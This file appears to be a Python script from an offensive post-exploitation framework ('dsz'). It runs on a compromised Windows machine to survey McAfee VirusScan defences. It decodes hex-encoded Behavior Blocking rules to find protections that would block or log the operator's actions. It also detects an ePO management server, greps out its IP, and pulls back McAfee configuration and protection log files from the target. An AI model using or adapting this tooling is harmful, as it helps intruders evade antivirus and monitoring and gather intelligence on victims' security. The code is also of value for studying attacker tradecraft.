
import dsz.ui, os.path, dsz.file, dsz.lp.gui.terminal
from ops.psp import comattribs, RegistryError
import binascii
from util.DSZPyLogger import getLogger
from ops.pprint import pprint
import ops
mcafeelog = getLogger('mcafee')

def runCmd(cmd, show=False):
    if show:
        dsz.control.echo.On()
    else:
        dsz.control.echo.Off()
    (suc, cmdid) = dsz.cmd.RunEx(ops.utf8(cmd), dsz.RUN_FLAG_RECORD)
    if show:
        dsz.control.echo.Off()
    else:
        dsz.control.echo.On()
    return (suc, cmdid)

def checksettings(psp):
    (suc, cmdid) = runCmd('environment -var DEFLOGDIR -get')
    deflogdir = '%DEFLOGDIR%'
    if suc:
        deflogdir = dsz.cmd.data.Get('environment::value::value', dsz.TYPE_STRING, cmdid)[0]
    if psp[comattribs.logfile]:
        psp[comattribs.logfile] = psp[comattribs.logfile].replace('%DEFLOGDIR%', deflogdir)
    if psp['BOLogFile']:
        psp['BOLogFile'] = psp['BOLogFile'].replace('%DEFLOGDIR%', deflogdir)
    customRules = False
    lookFor = []
    lookFor.append(['55736572456e666f7263652041564f30332031', 'AVO03', 'Block', 'Anti-virus Standard Protection:Prevent user rights policies from being altered'])
    lookFor.append(['557365725265706f72742041564f30332031', 'AVO03', 'Log', 'Anti-virus Standard Protection:Prevent user rights policies from being altered'])
    lookFor.append(['55736572456E666F7263652041564F30342031', 'AVO04', 'Block', 'Anti-virus Standard Protection: Prevent remote creation/modification of executable and configuration files'])
    lookFor.append(['557365725265706F72742041564F30342031', 'AVO04', 'Log', 'Anti-virus Standard Protection: Prevent remote creation/modification of executable and configuration files'])
    lookFor.append(['55736572456E666F7263652041564F30372031', 'AVO07', 'Block', 'Anti-virus Maximum Protection:Prevent svchost executing non-Windows executables'])
    lookFor.append(['557365725265706F72742041564F30372031', 'AVO07', 'Log', 'Anti-virus Maximum Protection:Prevent svchost executing non-Windows executables'])
    lookFor.append(['55736572456E666F7263652041564F30382031', 'AVO08', 'Block', 'Anti-virus Standard Protection:Prevent Windows Process Spoofing'])
    lookFor.append(['557365725265706F72742041564F30382031', 'AVO08', 'Log', 'Anti-virus Standard Protection:Prevent Windows Process Spoofing'])
    lookFor.append(['55736572456E666F7263652043573031612031', 'CW01a', 'Block', 'Common Maximum Protection:Prevent programs registering to autorun'])
    lookFor.append(['557365725265706F72742043573031612031', 'CW01a', 'Log', 'Common Maximum Protection:Prevent programs registering to autorun'])
    lookFor.append(['55736572456E666F7263652043573031622031', 'CW01b', 'Block', 'Common Maximum Protection:Prevent programs registering as a service'])
    lookFor.append(['557365725265706F72742043573031622031', 'CW01b', 'Log', 'Common Maximum Protection:Prevent programs registering as a service'])
    lookFor.append(['55736572456E666F7263652043573032612031', 'CW02a', 'Block', 'Common Maximum Protection:Prevent creation of new executable files in the Windows folder'])
    lookFor.append(['557365725265706F72742043573032612031', 'CW02a', 'Log', 'Common Maximum Protection:Prevent creation of new executable files in the Windows folder'])
    lookFor.append(['55736572456e666f7263652043573032622031', 'CW02b', 'Block', 'Common Maximum Protection:Prevent creation of new executable files in the Program Files folder'])
    lookFor.append(['557365725265706f72742043573032622031', 'CW02b', 'Log', 'Common Maximum Protection:Prevent creation of new executable files in the Program Files folder'])
    lookFor.append(['55736572456e666f72636520435730352031', 'CW05', 'Block', 'Common Maximum Protection:Prevent FTP communication'])
    lookFor.append(['557365725265706f727420435730352031', 'CW05', 'Log', 'Common Maximum Protection:Prevent FTP communication'])
    lookFor.append(['557365725265706f727420435730362031', 'CW06', 'Log', 'Common Maximum Protection:Prevent HTTP communication'])
    lookFor.append(['55736572456e666f72636520435730362031', 'CW06', 'Block', 'Common Maximum Protection:Prevent HTTP communication'])
    lookFor.append(['55736572456E666F7263652041565730322031', 'AVW02', 'Block', 'Anti-virus Maximum Protection:Protect cached files from password and email address stealers'])
    lookFor.append(['557365725265706F72742041565730322031', 'AVW02', 'Log', 'Anti-virus Maximum Protection:Protect cached files from password and email address stealers'])
    lookFor.append(['55736572456e666f7263652041534f30312031', 'ASO01', 'Block', 'Anti-Spyware Standard Protection:Protect Internet Explorer favorites and settings'])
    lookFor.append(['557365725265706f72742041534f30312031', 'ASO01', 'Log', 'Anti-Spyware Standard Protection:Protect Internet Explorer favorites and settings'])
    lookFor.append(['55736572456e666f7263652041535730312031', 'ASW01', 'Block', 'Anti-Spyware Maximum Protection:Prevent installation of new CLSIDs, APPIDs and TYPELIBs'])
    lookFor.append(['557365725265706F72742041535730312031', 'ASW01', 'Log', 'Anti-Spyware Maximum Protection:Prevent installation of new CLSIDs, APPIDs and TYPELIBs'])
    lookFor.append(['55736572456e666f7263652041535730332031', 'ASW03', 'Block', 'Anti-Spyware Maximum Protection:Prevent execution of script from the Temp folder'])
    lookFor.append(['557365725265706f72742041535730332031', 'ASW03', 'Log', 'Anti-Spyware Maximum Protection:Prevent execution of script from the Temp folder'])
    lookFor.append(['55736572456E666F7263652041564F31302031', 'AVO10', 'Block', 'Prevent mass mailing worm from sending mail'])
    lookFor.append(['557365725265706F72742041564F31302031', 'AVO10', 'Log', 'Prevent mass mailing worm from sending mail'])
    lookFor.append(['55736572456E666F726365204F4230312031', 'OB01', 'Block', 'Anti-virus Outbreak Control:Make all shares read-only'])
    lookFor.append(['557365725265706F7274204F4230312031', 'OB01', 'Log', 'Anti-virus Outbreak Control:Make all shares read-only'])
    lookFor.append(['55736572456e666f726365204f4230322031', 'OB02', 'Block', 'Anti-virus Outbreak Control:Block read and write access to all shares'])
    lookFor.append(['557365725265706f7274204f4230322031', 'OB02', 'Log', 'Anti-virus Outbreak Control:Block read and write access to all shares'])
    lookFor.append(['55736572456e666f72636520564d30312031', 'VM01', 'Block', 'Virtual Machine Protection:Prevent Termination of VMWare Processes'])
    lookFor.append(['557365725265706f727420564d30312031', 'VM01', 'Log', 'Virtual Machine Protection:Prevent Termination of VMWare Processes'])
    lookFor.append(['55736572456e666f72636520434f31322031', 'CO12', 'Block', 'Common Standard Protection:Protect network settings'])
    lookFor.append(['557365725265706f727420434f31322031', 'CO12', 'Log', 'Common Standard Protection:Protect network settings'])
    lookFor.append(['55736572456e666f726365205552', 'Custom', 'Custom', '!!!POSSIBLE CUSTOM RULES. REVIEW ASCII IN REGISTRY KEY!!!'])
    defaultSettings = '41636365737350726f74656374696f6e207b0d0a7d0d0a'
    if (defaultSettings == psp.BehaviorBlocking):
        dsz.ui.Echo('They are using the default Behavior Blocking rules.', dsz.GOOD)
    else:
        rules = []
        dsz.ui.Echo('They are not using the default settings.\nAttempting to display any troublesome settings. No output = safe\n', dsz.WARNING)
        for key in lookFor:
            if (psp.BehaviorBlocking.lower().find(key[0].lower()) >= 0):
                rule = {}
                rule['ID'] = key[1]
                rule['Type'] = key[2]
                rule['Description'] = key[3]
                rules.append(rule)
                if (key[0] == '55736572456e666f726365205552'):
                    customRules = True
        if (len(rules) > 0):
            pprint(rules)
        if customRules:
            display = dsz.ui.GetString('Would you like a full McAfee rules display?[y/n]')
            if (display.lower() == 'y'):
                f = open(os.path.join(dsz.env.Get('_LOGPATH'), 'GetFiles', 'NOSEND', 'McAfee_Settings.txt'), 'w')
                f.write(binascii.unhexlify(psp.BehaviorBlocking))
                f.close()
                ops.cmd.quickrun('local run -command "cmd /c notepad.exe {0}"'.format(os.path.join(dsz.env.Get('_LOGPATH'), 'GetFiles', 'NOSEND', 'McAfee_Settings.txt')))
    return

def queryreg(psp):
    print 'Pulling registry values to help determine current enforcement settings.\nThe default value is: AccessProtection{..}\n'
    if (psp.BehaviorBlocking == ''):
        psp.BBKey = 'Software\\McAfee\\VSCore\\On Access Scanner\\BehaviourBlocking'
        if (psp.version == '8.8'):
            psp.BBKey = 'Software\\McAfee\\SystemCore\\VSCore\\On Access Scanner\\BehaviourBlocking'
        try:
            psp.RegQueryAndSave('L', psp.BBKey, {'AccessProtectionUserRules': 'BehaviorBlocking'}, haltonerror=True)
        except RegistryError:
            dsz.ui.Echo('I cannot find the registry keys for this version of McAfee!', dsz.ERROR)

def epocheck(psp):
    print '\nChecking to see if we are calling home to an ePO server...'
    (suc, cmdid) = runCmd('registryquery -hive l -key "SOFTWARE\\Network Associates\\TVD\\Shared Components\\Framework" -value "Data Path"')
    if suc:
        datapath = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING, cmdid)[0]
    else:
        try:
            drive = os.path.splitdrive(dsz.env.Get('Ops_SystemDir'))[0]
        except:
            drive = 'c:\\'
        datapath = os.path.join(drive, 'Documents and Settings\\All Users\\Application Data\\Mcafee\\Common Framework')
    sslist = os.path.join(datapath, 'ServerSiteList.xml')
    smlist = os.path.join(datapath, 'SiteMapList.xml')
    agent = os.path.join(datapath, 'Agent.ini')
    ssl = dsz.file.Exists(sslist)
    sml = dsz.file.Exists(smlist)
    aml = dsz.file.Exists(agent)
    if (ssl and sml):
        dsz.ui.Echo('\n***********\nServerSiteList.xml file exists\nLooks like we have an ePO server somewhere.\n***********\n', dsz.WARNING)
        if dsz.ui.Prompt('Try to grep out the ePO Server IP?'):
            runCmd('grep "{0}" -pattern ServerIP'.format(sslist), True)
        if dsz.ui.Prompt('Would you like to pull back the configuration file for inspection?'):
            runCmd('copyget "{0}"'.format(sslist))
    elif (sml and (not ssl)):
        dsz.ui.Echo('\nSiteMapList.xml = True\nServerSiteList.xml = False\nLooks like a stand alone install.\n', dsz.WARNING)
    elif ((not ssl) and (not sml) and (not aml)):
        dsz.ui.Echo('\n***************\nCannot Verify Status!\nMost likely cause is the files are not in the default location.\nI checked:\n', dsz.WARNING)
        dsz.ui.Echo(sslist, dsz.WARNING)
        dsz.ui.Echo(smlist, dsz.WARNING)
        dsz.ui.Echo(agent, dsz.WARNING)
        if dsz.ui.Prompt('The rest of these checks will probably fail. Should I stop?'):
            return False
    elif (aml and ssl):
        dsz.ui.Echo('\n***********\nServerSiteList.xml file exists but SiteMapList.xml does not.\nLooks like we have an ePO server somewhere.\nThis may be a very recently installed box.\nPAY ATTENTION! NETWORK SECURITY MAY BE INCREASING!\n***********\n', dsz.ERROR)
        if dsz.ui.Prompt('Try to grep out the ePO Server IP?'):
            runCmd('grep "{0}" -pattern ServerIP'.format(sslist), True)
        if dsz.ui.Prompt('Would you like to pull back the configuration file for inspection?'):
            runCmd('copyget "{0}"'.format(sslist))
    elif aml:
        dsz.ui.Echo('\n***********\nThis looks like a brand new install. No ePO server found.\nPAY ATTENTION! NETWORK SECURITY MAY BE INCREASING!\n***********\n', dsz.ERROR)
    else:
        dsz.ui.Echo("\n*************\nIf you are reading this, you've found some weird state. I'm of no use to you. Good luck!\n***********", dsz.ERROR)
        return False
    (suc, cmdid) = runCmd('time')
    date = dsz.cmd.data.Get('TimeItem::GmtTime::date', dsz.TYPE_STRING, cmdid)[0]
    time = dsz.cmd.data.Get('TimeItem::GmtTime::time', dsz.TYPE_STRING, cmdid)[0]
    print '\nCurrent target time for reference is: {0} {1}Z'.format(date, time)
    aplog = os.path.realpath(os.path.join(datapath, '..', 'DesktopProtection', 'AccessProtectionLog.txt'))
    bolog = os.path.realpath(os.path.join(datapath, '..', 'DesktopProtection', 'BufferOverflowProtectionLog.txt'))
    chklogfile(aplog, 'AccessProtectionLog')
    chklogfile(bolog, 'BufferOverflowProtectionLog')

def chklogfile(logfile, name):
    print '\n+++++++++++++++++++\nChecking out {0}\n+++++++++++++++++++\n'.format(name)
    (suc, cmdid) = runCmd('fileattributes -file "{0}"'.format(logfile))
    if suc:
        fsize = dsz.cmd.data.Get('File::Size', dsz.TYPE_INT, cmdid)[0]
        mdate = dsz.cmd.data.Get('File::FileTimes::Modified::Date', dsz.TYPE_STRING, cmdid)[0]
        mtime = dsz.cmd.data.Get('File::FileTimes::Modified::Time', dsz.TYPE_STRING, cmdid)[0]
        print '{0} details:'.format(name)
        print 'Last modified on {0} at {1}Z'.format(mdate, mtime)
        print 'File size of {0} bytes'.format(fsize)
        if (fsize <= 3):
            dsz.ui.Echo('It appears the file is empty', dsz.GOOD)
        elif dsz.ui.Prompt('Would you like to copyget the file?'):
            runCmd('background copyget "{0}"'.format(logfile))
    else:
        dsz.ui.Echo('Sorry, I cannot find {0} in the default location. I looked in:\n"{1}"\n'.format(name, logfile), dsz.WARNING)

def main(psp):
    if (psp.version in ['8.5', '8.7', '8.8']):
        checksettings(psp)
    else:
        mcafeelog.error('The mcafee85To88 script was called with an invalid version of McAfee VirusScan: {0}'.format(psp.version))
    return psp